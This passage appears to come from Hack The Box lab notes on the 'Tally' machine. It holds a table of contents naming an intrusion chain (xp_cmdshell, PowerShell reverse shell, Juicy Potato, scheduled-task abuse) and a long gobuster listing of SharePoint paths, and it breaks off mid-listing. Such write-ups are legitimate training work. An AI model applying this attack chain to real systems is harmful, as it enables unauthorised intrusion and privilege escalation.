<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>tally</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#tally">tally</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#all ports">all ports</a></li>
<li><a href="#gobuster">gobuster</a></li>
<ol>
<li><a href="#sharepoint">sharepoint</a></li>
<ol>
<li><a href="#viewlists.aspx">viewlists.aspx</a></li>
<ol>
<li><a href="#/Documents">/Documents</a></li>
<li><a href="#Site Pages">Site Pages</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="#ftp">ftp</a></li>
<ol>
<li><a href="#find . -type f">find . -type f</a></li>
</ol>
<li><a href="#keepass">keepass</a></li>
<ol>
<li><a href="#kpcli -kdb tim.kdbx">kpcli -kdb tim.kdbx</a></li>
</ol>
<li><a href="#smb">smb</a></li>
<ol>
<li><a href="#mounting smb account share">mounting smb account share</a></li>
<li><a href="#connecting to the smb share with smbclient">connecting to the smb share with smbclient</a></li>
<ol>
<li><a href="#zz_Archived (dead end)">zz_Archived (dead end)</a></li>
<li><a href="#zz_Migration/Binaries/New Folder/tester.exe">zz_Migration/Binaries/New Folder/tester.exe</a></li>
</ol>
</ol>
<li><a href="#sqsh interactive database shell">sqsh interactive database shell</a></li>
<ol>
<li><a href="#xp_cmdshell does not exist">xp_cmdshell does not exist</a></li>
<li><a href="#reconfigure">reconfigure</a></li>
<li><a href="#xp_cmdshell 'whoami'">xp_cmdshell 'whoami'</a></li>
<li><a href="#powershell IEX revshell">powershell IEX revshell</a></li>
</ol>
<li><a href="#privesc w/ juicy potato">privesc w/ juicy potato</a></li>
<ol>
<li><a href="#juicy potato">juicy potato</a></li>
</ol>
<li><a href="#priv esc w/ scheduled task">priv esc w/ scheduled task</a></li>
<ol>
<li><a href="#SPBestWarmUp.ps1">SPBestWarmUp.ps1</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#Lessons Learned">Lessons Learned</a></li>
</ol></div>
<div class="page" id="tally"><h1><b><u>tally</u></b></h1><img alt="images/1698-1.png" src="images/1698-1.png"/><br/><img alt="images/1698-2.png" src="images/1698-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1>Lets start off with an nmapAutomator scan<br/>nmapAutomator<br/><img alt="images/1699-1.png" src="images/1699-1.png"/><span style="color:#24ff00;"><br/>---------------------------------------------------------------------------------------------------------------------------------------------<br/></span><img alt="images/1699-2.png" src="images/1699-2.png"/><br/><img alt="images/1699-3.png" src="images/1699-3.png"/></div>
<div class="page" id="all ports"><h1><b><u>all ports</u></b></h1><img alt="images/1700-1.png" src="images/1700-1.png"/><img alt="images/1700-2.png" src="images/1700-2.png"/><br/><img alt="images/1700-3.png" src="images/1700-3.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/1701-1.png" src="images/1701-1.png"/></div>
<div class="page" id="sharepoint"><h1><b><u>sharepoint</u></b></h1><div class = "codebox"><div style="background-color: #001b33; padding: 10px; border: 1px solid green;">cat sharepoint_gobust.txt  | more<br/>/_app_bin (Status: 301)<br/>/_controltemplates (Status: 301)<br/>/_layouts (Status: 301)<br/>/_layouts/1033 (Status: 301)<br/>/_layouts/1033/avreport.htm (Status: 200)<br/>/_layouts/1033/error.htm (Status: 200)<br/>/_layouts/1033/filedlg.htm (Status: 200)<br/>/_layouts/1033/fontdlg.htm (Status: 200)<br/>/_layouts/1033/images (Status: 301)<br/>/_layouts/1033/iframe.htm (Status: 200)<br/>/_layouts/1033/instable.htm (Status: 200)<br/>/_layouts/1033/menu.htc (Status: 200)<br/>/_layouts/1033/menubar.htc (Status: 200)<br/>/_layouts/1033/selcolor.htm (Status: 200)<br/>/_layouts/1033/spthemes.xsd (Status: 200)<br/>/_layouts/1033/spthemes.xml (Status: 200)<br/>/_layouts/accessdenied.aspx (Status: 302)<br/>/_layouts/addcontenttypetolist.aspx (Status: 302)<br/>/_layouts/addfieldfromtemplate.aspx (Status: 302)<br/>/_layouts/aclinv.aspx (Status: 302)<br/>/_layouts/addwrkfl.aspx (Status: 302)<br/>/_layouts/advsetng.aspx (Status: 302)<br/>/_layouts/adminrecyclebin.aspx (Status: 302)<br/>/_layouts/addrole.aspx (Status: 302)<br/>/_layouts/approve.aspx (Status: 302)<br/>/_layouts/aspxform.aspx (Status: 302)<br/>/_layouts/addnavigationlinkdialog.aspx (Status: 200)<br/>/_layouts/addfiletype.aspx (Status: 200)<br/>/_layouts/addservernamemappings.aspx (Status: 200)<br/>/_layouts/areanavigationsettings.aspx (Status: 200)<br/>/_layouts/areatemplatesettings.aspx (Status: 200)<br/>/_layouts/addcontentsource.aspx (Status: 200)<br/>/_layouts/areacachesettings.aspx (Status: 200)<br/>/_layouts/assetedithyperlink.aspx (Status: 200)<br/>/_layouts/areawelcomepage.aspx (Status: 200)<br/>/_layouts/assetimagepicker.aspx (Status: 200)<br/>/_layouts/assocwrkfl.aspx (Status: 302)<br/>/_layouts/associatedgroups.aspx (Status: 302)<br/>/_layouts/audience_memberlist.aspx (Status: 200)<br/>/_layouts/assetportalbrowser.aspx (Status: 200)<br/>/_layouts/audience_main.aspx (Status: 200)<br/>/_layouts/audience_edit.aspx (Status: 200)<br/>/_layouts/assetuploader.aspx (Status: 200)<br/>/_layouts/audience_list.aspx (Status: 200)<br/>/_layouts/audience_defruleedit.aspx (Status: 200)<br/>/_layouts/auditsettings.aspx (Status: 200)<br/>/_layouts/audience_view.aspx (Status: 200)<br/>/_layouts/audience_sched.aspx (Status: 200)<br/>/_layouts/backlinks.aspx (Status: 302)<br/>/_layouts/authenticate.aspx (Status: 302)<br/>/_layouts/avreport.aspx (Status: 302)<br/>/_layouts/bdcadminui/bdcapplications.aspx (Status: 200)<br/>/_layouts/bdcadminui/exportbdcapplication.aspx (Status: 200)<br/>/_layouts/bdcadminui/bdcentities.aspx (Status: 200)<br/>/_layouts/bdcadminui/bdcentities.aspx (Status: 200)<br/>/_layouts/bdcadminui/editbdcaction.aspx (Status: 200)<br/>/_layouts/bdcadminui/addbdcaction.aspx (Status: 200)<br/>/_layouts/bdcadminui/addbdcapplication.aspx (Status: 200)<br/>/_layouts/barcodeimagefromitem.aspx (Status: 200)<br/>/_layouts/bdcadminui/viewbdcentity.aspx (Status: 200)<br/>/_layouts/bdcadminui/viewbdcapplication.aspx (Status: 200)<br/>/_layouts/bdcadminui/managepermissions.aspx (Status: 200)<br/>/_layouts/bestbet.aspx (Status: 302)<br/>/_layouts/changecontenttypeoptionalsettings.aspx (Status: 302)<br/>/_layouts/bulkwrktaskip.aspx (Status: 200)<br/>/_layouts/bulkwrktaskhandler.aspx (Status: 200)<br/>/_layouts/bpcf.aspx (Status: 302)<br/>/_layouts/businessdatasynchronizer.aspx (Status: 302)<br/>/_layouts/changesitemasterpage.aspx (Status: 200)<br/>/_layouts/category.aspx (Status: 302)<br/>/_layouts/changecontenttypeorder.aspx (Status: 302)<br/>/_layouts/changefieldorder.aspx (Status: 302)<br/>/_layouts/checkin.aspx (Status: 302)<br/>/_layouts/cmsslwpaddeditlink.aspx (Status: 200)<br/>/_layouts/cmsslwpaddeditgroup.aspx (Status: 200)<br/>/_layouts/cmsslwpeditview.aspx (Status: 200)<br/>/_layouts/cmsslwpsortlinks.aspx (Status: 200)<br/>/_layouts/contenttypeconvertersettings.aspx (Status: 200)<br/>/_layouts/convertersettings.aspx (Status: 200)<br/>/_layouts/contentaccessaccount.aspx (Status: 200)<br/>/_layouts/copyresults.aspx (Status: 302)<br/>/_layouts/containerpicker.aspx (Status: 302)<br/>/_layouts/copyrole.aspx (Status: 302)<br/>/_layouts/copy.aspx (Status: 302)<br/>/_layouts/conngps.aspx (Status: 302)<br/>/_layouts/confirmation.aspx (Status: 302)<br/>/_layouts/crawledproperty.aspx (Status: 302)<br/>/_layouts/create.aspx (Status: 302)<br/>/_layouts/copyutil.aspx (Status: 302)<br/>/_layouts/createadaccount.aspx (Status: 302)<br/>/_layouts/cstwrkflip.aspx (Status: 200)<br/>/_layouts/ctdmsettings.aspx (Status: 200)<br/>/_layouts/createworkbook.aspx (Status: 200)<br/>/_layouts/customizereport.aspx (Status: 200)<br/>/_layouts/createpage.aspx (Status: 200)<br/>/_layouts/createws.aspx (Status: 302)<br/>/_layouts/createwebpage.aspx (Status: 302)<br/>/_layouts/ctypedit.aspx (Status: 302)<br/>/_layouts/ctypenew.aspx (Status: 302)<br/>/_layouts/discbar.aspx (Status: 302)<br/>/_layouts/dws.aspx (Status: 302)<br/>/_layouts/deletemu.aspx (Status: 302)<br/>/_layouts/download.aspx (Status: 302)<br/>/_layouts/doctrans.aspx (Status: 302)<br/>/_layouts/dladvopt.aspx (Status: 302)<br/>/_layouts/deleteweb.aspx (Status: 302)<br/>/_layouts/deactivatefeature.aspx (Status: 302)<br/>/_layouts/dynamicimageprovider.aspx (Status: 200)<br/>/_layouts/dmplaceholder.aspx (Status: 200)<br/>/_layouts/editnav.aspx (Status: 302)<br/>/_layouts/editgrp.aspx (Status: 302)<br/>/_layouts/editprms.aspx (Status: 302)<br/>/_layouts/editcopyinformation.aspx (Status: 302)<br/>/_layouts/editdsserver.aspx (Status: 200)<br/>/_layouts/editprofile.aspx (Status: 200)<br/>/_layouts/editcrawlrule.aspx (Status: 200)<br/>/_layouts/editpolicy.aspx (Status: 200)<br/>/_layouts/editproperty.aspx (Status: 200)<br/>/_layouts/editcontentsource.aspx (Status: 200)<br/>/_layouts/editrole.aspx (Status: 302)<br/>/_layouts/editpropertynames.aspx (Status: 200)<br/>/_layouts/editpropertynames2.aspx (Status: 200)<br/>/_layouts/editrelevancesettings.aspx (Status: 200)<br/>/_layouts/editview.aspx (Status: 302)<br/>/_layouts/enhancedsearch.aspx (Status: 302)<br/>/_layouts/emaildetails.aspx (Status: 302)<br/>/_layouts/error.aspx (Status: 302)<br/>/_layouts/emailsettings.aspx (Status: 302)<br/>/_layouts/enablealerts.aspx (Status: 200)<br/>/_layouts/ewrcustomfilter.aspx (Status: 200)<br/>/_layouts/editschedule.aspx (Status: 200)<br/>/_layouts/editsection.aspx (Status: 200)<br/>/_layouts/ewrfilter.aspx (Status: 200)<br/>/_layouts/ewrfind.aspx (Status: 200)<br/>/_layouts/excelcellpicker.aspx (Status: 200)<br/>/_layouts/ewrpredialog.aspx (Status: 200)<br/>/_layouts/ewrtop10.aspx (Status: 200)<br/>/_layouts/excelserversafedataprovider.aspx (Status: 200)<br/>/_layouts/excelservertrustedlocation.aspx (Status: 200)<br/>/_layouts/excelprofilepage.aspx (Status: 200)<br/>/_layouts/excelservertrusteddcl.aspx (Status: 200)<br/>/_layouts/excelserversafedataproviders.aspx (Status: 200)<br/>/_layouts/excelserversettings.aspx (Status: 200)<br/>/_layouts/excelservertrusteddcls.aspx (Status: 200)<br/>/_layouts/excelrenderer.aspx (Status: 200)<br/>/_layouts/excelserveruserdefinedfunction.aspx (Status: 200)<br/>/_layouts/exportpolicy.aspx (Status: 200)<br/>/_layouts/excelserveruserdefinedfunctions.aspx (Status: 200)<br/>/_layouts/excelservertrustedlocations.aspx (Status: 200)<br/>/_layouts/feed.aspx (Status: 200)<br/>/_layouts/exemptpolicy.aspx (Status: 200)<br/>/_layouts/filter.aspx (Status: 302)<br/>/_layouts/fldeditex.aspx (Status: 302)<br/>/_layouts/fldedit.aspx (Status: 302)<br/>/_layouts/filtervaluespickerdialog.aspx (Status: 302)<br/>/_layouts/formedt.aspx (Status: 302)<br/>/_layouts/fldnew.aspx (Status: 302)<br/>/_layouts/fldpick.aspx (Status: 302)<br/>/_layouts/fldnewex.aspx (Status: 302)<br/>/_layouts/formresource.aspx (Status: 200)<br/>/_layouts/folders.aspx (Status: 200)<br/>/_layouts/groups.aspx (Status: 302)<br/>/_layouts/genericpicker.aspx (Status: 302)<br/>/_layouts/gear.aspx (Status: 302)<br/>/_layouts/formserver.aspx (Status: 200)<br/>/_layouts/getssploginfo.aspx (Status: 200)<br/>/_layouts/getsspstatus.aspx (Status: 200)<br/>/_layouts/formserverattachments.aspx (Status: 200)<br/>/_layouts/formserverdetector.aspx (Status: 200)<br/>/_layouts/getdataconnectionfile.aspx (Status: 200)<br/>/_layouts/getsspscopes.aspx (Status: 200)<br/>/_layouts/htmltrredir.aspx (Status: 302)<br/>/_layouts/helpsearch.aspx (Status: 302)<br/>/_layouts/help.aspx (Status: 302)<br/>/_layouts/htmltrverify.aspx (Status: 302)<br/>/_layouts/iframe.aspx (Status: 302)<br/>/_layouts/htmledit.aspx (Status: 302)<br/>/_layouts/helpcontent.aspx (Status: 302)<br/>/_layouts/htmltranslate.aspx (Status: 302)<br/>/_layouts/images/ (Status: 403)<br/>/_layouts/infopage.aspx (Status: 302)<br/>/_layouts/holdreport.aspx (Status: 200)<br/>/_layouts/hold.aspx (Status: 200)<br/>/_layouts/irm.aspx (Status: 302)<br/>/_layouts/itemrwfassoc.aspx (Status: 302)<br/>/_layouts/irmrept.aspx (Status: 302)<br/>/_layouts/indxcol.aspx (Status: 302)<br/>/_layouts/iniwrkflip.aspx (Status: 200)<br/>/_layouts/importpolicy.aspx (Status: 200)<br/>/_layouts/listedit.aspx (Status: 302)<br/>/_layouts/labelimage.aspx (Status: 200)<br/>/_layouts/listgeneralsettings.aspx (Status: 302)<br/>/_layouts/linkscheckerwiz.aspx (Status: 200)<br/>/_layouts/keyword.aspx (Status: 302)<br/>/_layouts/listfeed.aspx (Status: 302)<br/>/_layouts/linkschecker.aspx (Status: 200)<br/>/_layouts/iviewhost.aspx (Status: 200)<br/>/_layouts/listkeywords.aspx (Status: 302)<br/>/_layouts/listenabletargeting.aspx (Status: 200)<br/>/_layouts/listcontentsources.aspx (Status: 200)<br/>/_layouts/listsyndication.aspx (Status: 302)<br/>/_layouts/login.aspx (Status: 302)<br/>/_layouts/listservernamemappings.aspx (Status: 200)<br/>/_layouts/logsummary.aspx (Status: 200)<br/>/_layouts/managecontenttype.aspx (Status: 302)<br/>/_layouts/longrunningoperationprogress.aspx (Status: 200)<br/>/_layouts/logviewer.aspx (Status: 200)<br/>/_layouts/lstsetng.aspx (Status: 302)<br/>/_layouts/managecheckedoutfiles.aspx (Status: 302)<br/>/_layouts/managecontenttypefield.aspx (Status: 302)<br/>/_layouts/lroperationstatus.aspx (Status: 200)<br/>/_layouts/managefiletypes.aspx (Status: 200)<br/>/_layouts/managefeatures.aspx (Status: 302)<br/>/_layouts/managefeatures.aspx?scope=site (Status: 302)<br/>/_layouts/managedproperty.aspx (Status: 302)<br/>/_layouts/managecopies.aspx (Status: 302)<br/>/_layouts/manageprivacypolicy.aspx (Status: 200)<br/>/_layouts/managecrawlrules.aspx (Status: 200)<br/>/_layouts/manageitemscheduling.aspx (Status: 200)<br/>/_layouts/matchingrule.aspx (Status: 302)<br/>/_layouts/manageservicepermissions.aspx (Status: 200)<br/>/_layouts/mgrproperty.aspx (Status: 200)<br/>/_layouts/metaweblog.aspx (Status: 302)<br/>/_layouts/mngfield.aspx (Status: 302)<br/>/_layouts/mngsiteadmin.aspx (Status: 302)<br/>/_layouts/mngdisc.aspx (Status: 200)<br/>/_layouts/mcontent.aspx (Status: 302)<br/>/_layouts/mgrdsserver.aspx (Status: 200)<br/>/_layouts/mngsubwebs.aspx (Status: 302)<br/>/_layouts/mngctype.aspx (Status: 302)<br/>/_layouts/mobile/bloghome.aspx (Status: 302)<br/>/_layouts/mngsubwebs.aspx?view=sites (Status: 302)<br/>/_layouts/mobile/delete.aspx (Status: 302)<br/>/_layouts/mobile/dispform.aspx (Status: 302)<br/>/_layouts/mobile/mblerror.aspx (Status: 302)<br/>/_layouts/mobile/mbllists.aspx (Status: 302)<br/>/_layouts/mobile/disppost.aspx (Status: 302)<br/>/_layouts/mobile/editform.aspx (Status: 302)<br/>/_layouts/mobile/mbllogout.aspx (Status: 302)<br/>/_layouts/mobile/default.aspx (Status: 302)<br/>/_layouts/mobile/mbllogin.aspx (Status: 302)<br/>/_layouts/mobile/mobileformserver.aspx (Status: 200)<br/>/_layouts/mobile/viewcomment.aspx (Status: 302)<br/>/_layouts/mobile/newcomment.aspx (Status: 302)<br/>/_layouts/mobile/view.aspx (Status: 302)<br/>/_layouts/mobile/newpost.aspx (Status: 302)<br/>/_layouts/mtgredir.aspx (Status: 302)<br/>/_layouts/myinfo.aspx (Status: 200)<br/>/_layouts/mymemberships.aspx (Status: 200)<br/>/_layouts/modwrkflip.aspx (Status: 200)<br/>/_layouts/mobile/newform.aspx (Status: 302)<br/>/_layouts/mycontactlinks.aspx (Status: 200)<br/>/_layouts/mysubs.aspx (Status: 302)<br/>/_layouts/mysite.aspx (Status: 200)<br/>/_layouts/mypage.aspx (Status: 200)<br/>/_layouts/newdwp.aspx (Status: 302)<br/>/_layouts/mysiteheader.aspx (Status: 200)<br/>/_layouts/navoptions.aspx (Status: 302)<br/>/_layouts/myquicklinks.aspx (Status: 200)<br/>/_layouts/mytasks.aspx (Status: 302)<br/>/_layouts/newnav.aspx (Status: 302)<br/>/_layouts/newsbweb.aspx (Status: 302)<br/>/_layouts/newgrp.aspx (Status: 302)<br/>/_layouts/newlink.aspx (Status: 302)<br/>/_layouts/new.aspx (Status: 302)<br/>/_layouts/newmws.aspx (Status: 302)<br/>/_layouts/newpagelayout.aspx (Status: 200)<br/>/_layouts/newtranslationmanagement.aspx (Status: 200)<br/>/_layouts/pageversioninfo.aspx (Status: 200)<br/>/_layouts/officialfilesuccess.aspx (Status: 200)<br/>/_layouts/officialfilesetup.aspx (Status: 200)<br/>/_layouts/nocrawlsettings.aspx (Status: 200)<br/>/_layouts/newvariationsite.aspx (Status: 200)<br/>/_layouts/osssearchresults.aspx (Status: 302)<br/>/_layouts/password.aspx (Status: 302)<br/>/_layouts/pagesettings.aspx (Status: 200)<br/>/_layouts/objectcachesettings.aspx (Status: 200)<br/>/_layouts/people.aspx (Status: 302)<br/>/_layouts/pickertreeview.aspx (Status: 200)<br/>/_layouts/personalsites.aspx (Status: 200)<br/>/_layouts/pickerresult.aspx (Status: 200)<br/>/_layouts/policy.aspx (Status: 200)<br/>/_layouts/picker.aspx (Status: 302)<br/>/_layouts/people.aspx?membershipgroupid=0 (Status: 302)<br/>/_layouts/permsetup.aspx (Status: 302)<br/>/_layouts/policyconfig.aspx (Status: 200)<br/>/_layouts/portal.aspx (Status: 302)<br/>/_layouts/portalview.aspx (Status: 302)<br/>/_layouts/prjsetng.aspx (Status: 302)<br/>/_layouts/profileredirect.aspx (Status: 302)<br/>/_layouts/policylist.aspx (Status: 200)<br/>/_layouts/postback.formserver.aspx (Status: 200)<br/>/_layouts/policycts.aspx (Status: 200)<br/>/_layouts/print.formserver.aspx (Status: 200)<br/>/_layouts/printloader.formserver.aspx (Status: 200)<br/>/_layouts/profadminedit.aspx (Status: 200)<br/>/_layouts/profnew.aspx (Status: 200)<br/>/_layouts/profmain.aspx (Status: 200)<br/>/_layouts/proxy.aspx (Status: 200)<br/>/_layouts/qstnew.aspx (Status: 302)<br/>/_layouts/qlreord.aspx (Status: 302)<br/>/_layouts/qstedit.aspx (Status: 302)<br/>/_layouts/publishback.aspx (Status: 302)<br/>/_layouts/quicklinks.aspx (Status: 200)<br/>/_layouts/quicklinksdialog.aspx (Status: 200)<br/>/_layouts/profmngr.aspx (Status: 200)<br/>/_layouts/reghost.aspx (Status: 302)<br/>/_layouts/rcxform.aspx (Status: 302)<br/>/_layouts/regionalsetng.aspx (Status: 302)<br/>/_layouts/recyclebin.aspx (Status: 302)<br/>/_layouts/quiklnch.aspx (Status: 302)<br/>/_layouts/redirect.aspx (Status: 302)<br/>/_layouts/redirectpage.aspx (Status: 200)<br/>/_layouts/redirectpage.aspx?target={sitecollectionurl}_catalogs/masterpage (Status: 200)<br/>/_layouts/quicklinksdialogform.aspx (Status: 200)<br/>/_layouts/quicklinksdialog2.aspx (Status: 200)<br/>/_layouts/reorder.aspx (Status: 302)<br/>/_layouts/reqfeatures.aspx (Status: 302)<br/>/_layouts/reqgroup.aspx (Status: 302)<br/>/_layouts/reqacc.aspx (Status: 302)<br/>/_layouts/remwrkfl.aspx (Status: 302)<br/>/_layouts/reqgroupconfirm.aspx (Status: 302)<br/>/_layouts/reporting.aspx (Status: 200)<br/>/_layouts/rellinksscopesettings.aspx (Status: 200)<br/>/_layouts/resolverecipient.aspx (Status: 200)<br/>/_layouts/renderudc.aspx (Status: 200)<br/>/_layouts/releasehold.aspx (Status: 200)<br/>/_layouts/rssxslt.aspx (Status: 302)<br/>/_layouts/role.aspx (Status: 302)<br/>/_layouts/rfpxform.aspx (Status: 302)<br/>/_layouts/rfcxform.aspx (Status: 302)<br/>/_layouts/rte2ecell.aspx (Status: 200)<br/>/_layouts/savetmpl.aspx (Status: 302)<br/>/_layouts/scope.aspx (Status: 302)<br/>/_layouts/rtedialog.aspx (Status: 302)<br/>/_layouts/scopedisplaygroup.aspx (Status: 302)<br/>/_layouts/scsignup.aspx (Status: 302)<br/>/_layouts/rte2erowcolsize.aspx (Status: 200)<br/>/_layouts/reusabletextpicker.aspx (Status: 200)<br/>/_layouts/rte2pueditor.aspx (Status: 200)<br/>/_layouts/rte2etable.aspx (Status: 200)<br/>/_layouts/schema.aspx (Status: 200)<br/>/_layouts/runreport.aspx (Status: 200)<br/>/_layouts/searchresults.aspx (Status: 302)<br/>/_layouts/searchresultremoval.aspx (Status: 200)<br/>/_layouts/searchreset.aspx (Status: 200)<br/>/_layouts/searchandaddtohold.aspx (Status: 200)<br/>/_layouts/selectcrawledproperty.aspx (Status: 302)<br/>/_layouts/selectmanagedproperty.aspx (Status: 302)<br/>/_layouts/searchsspsettings.aspx (Status: 200)<br/>/_layouts/selectuser.aspx (Status: 200)<br/>/_layouts/selectpicture2.aspx (Status: 200)<br/>/_layouts/setimport.aspx (Status: 200)<br/>/_layouts/selectpicture.aspx (Status: 200)<br/>/_layouts/setrqacc.aspx (Status: 302)<br/>/_layouts/setanon.aspx (Status: 302)<br/>/_layouts/sendtoofficialfile.aspx (Status: 401)<br/>/_layouts/signout.aspx (Status: 302)<br/>/_layouts/settings.aspx (Status: 302)<br/>/_layouts/siterss.aspx (Status: 302)<br/>/_layouts/signaturedetailsloader.formserver.aspx (Status: 200)<br/>/_layouts/signaturedetails.formserver.aspx (Status: 200)<br/>/_layouts/signaturedetailspngloader.formserver.aspx (Status: 200)<br/>/_layouts/sitecachesettings.aspx (Status: 200)<br/>/_layouts/signatureeula.formserver.aspx (Status: 200)<br/>/_layouts/sitemanager.aspx?lro=all (Status: 200)<br/>/_layouts/signature.formserver.aspx (Status: 200)<br/>/_layouts/sitemanager.aspx (Status: 200)<br/>/_layouts/sitedirectorysettings.aspx (Status: 200)<br/>/_layouts/smtcommentsdialog.aspx (Status: 200)<br/>/_layouts/slnew.aspx (Status: 200)<br/>/_layouts/spusageconfig.aspx (Status: 200)<br/>/_layouts/spellchecker.aspx (Status: 200)<br/>/_layouts/sledit.aspx (Status: 200)<br/>/_layouts/spsredirect.aspx (Status: 200)<br/>/_layouts/spnewdashboard.aspx (Status: 200)<br/>/_layouts/spcf.aspx (Status: 302)<br/>/_layouts/sitesubs.aspx (Status: 302)<br/>/_layouts/spcontnt.aspx (Status: 302)<br/>/_layouts/spusagesiteclickthroughs.aspx (Status: 200)<br/>/_layouts/spusagesitereferrers.aspx (Status: 200)<br/>/_layouts/spusagesitesearchqueries.aspx (Status: 200)<br/>/_layouts/spusagesitesearchresults.aspx (Status: 200)<br/>/_layouts/spusagesitehomepage.aspx (Status: 200)<br/>/_layouts/spusagesite.aspx (Status: 200)<br/>/_layouts/spusagewebusers.aspx (Status: 200)<br/>/_layouts/spusagewebtoppages.aspx (Status: 200)<br/>/_layouts/spusagesitetoppages.aspx (Status: 200)<br/>/_layouts/spusagewebclickthroughs.aspx (Status: 200)<br/>/_layouts/spusagesspsearchqueries.aspx (Status: 200)<br/>/_layouts/spusagesspsearchresults.aspx (Status: 200)<br/>/_layouts/spusageweb.aspx (Status: 200)<br/>/_layouts/spusagewebreferrers.aspx (Status: 200)<br/>/_layouts/spusagesiteusers.aspx (Status: 200)<br/>/_layouts/spusagewebhomepage.aspx (Status: 200)<br/>/_layouts/ssologon.aspx (Status: 200)<br/>/_layouts/subchoos.aspx (Status: 302)<br/>/_layouts/submitrepair.aspx (Status: 302)<br/>/_layouts/storman.aspx (Status: 302)<br/>/_layouts/subnew.aspx (Status: 302)<br/>/_layouts/srchvis.aspx (Status: 302)<br/>/_layouts/srchrss.aspx (Status: 302)<br/>/_layouts/success.aspx (Status: 302)<br/>/_layouts/subedit.aspx (Status: 302)<br/>/_layouts/topnav.aspx (Status: 302)<br/>/_layouts/survedit.aspx (Status: 302)<br/>/_layouts/updatecopies.aspx (Status: 302)<br/>/_layouts/themeweb.aspx (Status: 302)<br/>/_layouts/toolpane.aspx (Status: 302)<br/>/_layouts/templatepick.aspx (Status: 302)<br/>/_layouts/tnreord.aspx (Status: 302)<br/>/_layouts/updateschedule.aspx (Status: 200)<br/>/_layouts/translatablesettings.aspx (Status: 200)<br/>/_layouts/unapprovedresources.aspx (Status: 200)<br/>/_layouts/userdisp.aspx?id=1 (Status: 302)<br/>/_layouts/user.aspx (Status: 302)<br/>/_layouts/useconfirmation.aspx (Status: 302)<br/>/_layouts/usage.aspx (Status: 302)<br/>/_layouts/usagedetails.aspx (Status: 302)<br/>/_layouts/upload.aspx (Status: 302)<br/>/_layouts/userdisp.aspx (Status: 302)<br/>/_layouts/useredit.aspx (Status: 302)<br/>/_layouts/useredit.aspx?id=1&amp;source=%2f%5flayouts%2fpeople%2easpx (Status: 302)<br/>/_layouts/versiondiff.aspx (Status: 302)<br/>/_layouts/versions.aspx (Status: 302)<br/>/_layouts/variationsettings.aspx (Status: 200)<br/>/_layouts/variations/variationimport.aspx (Status: 200)<br/>/_layouts/variationlabel.aspx (Status: 200)<br/>/_layouts/variationexport.aspx (Status: 200)<br/>/_layouts/variationlogs.aspx (Status: 200)<br/>/_layouts/variationlabels.aspx (Status: 200)<br/>/_layouts/viewscopesettings.aspx (Status: 302)<br/>/_layouts/viewnew.aspx (Status: 302)<br/>/_layouts/viewlsts.aspx (Status: 302)<br/>/_layouts/viewedit.aspx (Status: 302)<br/>/_layouts/viewtype.aspx (Status: 302)<br/>/_layouts/vsubwebs.aspx (Status: 302)<br/>/_layouts/viewgrouppermissions.aspx (Status: 302)<br/>/_layouts/viewscopes.aspx (Status: 302)<br/>/_layouts/webpartgallerypickerpage.aspx (Status: 302)<br/>/_layouts/webdeleted.aspx (Status: 302)<br/>/_layouts/workspce.aspx (Status: 302)<br/>/_layouts/workflow.aspx (Status: 302)<br/>/_layouts/wpprevw.aspx (Status: 302)<br/>/_layouts/wpeula.aspx (Status: 302)<br/>/_layouts/wrksetng.aspx (Status: 302)<br/>/_layouts/wpprevw.aspx?id=247 (Status: 302)<br/>/_layouts/wrkstat.aspx (Status: 302)<br/>/_layouts/wsrpmarkupproxy.aspx (Status: 200)<br/>/_layouts/zoombldr.aspx (Status: 302)<br/>/_vti_bin (Status: 301)<br/>/_vti_bin/_vti_adm/admin.dll (Status: 200)<br/>/_vti_bin/alertsdisco.aspx (Status: 200)<br/>/_vti_bin/_vti_aut/author.dll (Status: 200)<br/>/_vti_bin/alerts.asmx (Status: 200)<br/>/_layouts/xlatewfassoc.aspx (Status: 200)<br/>/_vti_adm/admin.asmx (Status: 200)<br/>/_vti_bin/alertswsdl.aspx (Status: 200)<br/>/_layouts/xlviewer.aspx (Status: 200)<br/>/_layouts/wrktaskip.aspx (Status: 200)<br/>/_vti_bin/dspsts.asmx (Status: 200)<br/>/_vti_bin/dspstsdisco.aspx (Status: 200)<br/>/_vti_bin/authentication.asmx (Status: 200)<br/>/_vti_bin/copy.asmx (Status: 200)<br/>/_vti_bin/dspstswsdl.aspx (Status: 200)<br/>/_vti_bin/dws.asmx (Status: 200)<br/>/_vti_bin/dwsdisco.aspx (Status: 200)<br/>/_vti_bin/exportwp.aspx (Status: 302)<br/>/_vti_bin/dwswsdl.aspx (Status: 200)<br/>/_vti_bin/forms.asmx (Status: 200)<br/>/_vti_bin/imaging.asmx (Status: 200)<br/>/_vti_bin/formsdisco.aspx (Status: 200)<br/>/_vti_bin/imagingdisco.aspx (Status: 200)<br/>/_vti_bin/formswsdl.aspx (Status: 200)<br/>/_vti_bin/listsdisco.aspx (Status: 200)<br/>/_vti_bin/meetings.asmx (Status: 200)<br/>/_vti_bin/lists.asmx (Status: 200)<br/>/_vti_bin/meetingsdisco.aspx (Status: 200)<br/>/_vti_bin/imagingwsdl.aspx (Status: 200)<br/>/_vti_bin/meetingswsdl.aspx (Status: 200)<br/>/_vti_bin/listswsdl.aspx (Status: 200)<br/>/_vti_bin/people.asmx (Status: 200)<br/>/_vti_bin/permissions.asmx (Status: 200)<br/>/_vti_bin/microsoft.sharepoint.xml (Status: 200)<br/>/_vti_bin/searchdisco.aspx (Status: 200)<br/>/_vti_bin/search.asmx (Status: 200)<br/>/_vti_bin/publishedlinksservice.asmx (Status: 200)<br/>/_vti_bin/permissionswsdl.aspx (Status: 200)<br/>/_vti_bin/permissionsdisco.aspx (Status: 200)<br/>/_vti_bin/sitedatadisco.aspx (Status: 200)<br/>/_vti_bin/sitedata.asmx (Status: 200)<br/>/_vti_bin/sitedatawsdl.aspx (Status: 200)<br/>/_vti_bin/searchwsdl.aspx (Status: 200)<br/>/_vti_bin/sites.asmx (Status: 200)<br/>/_vti_bin/shtml.dll (Status: 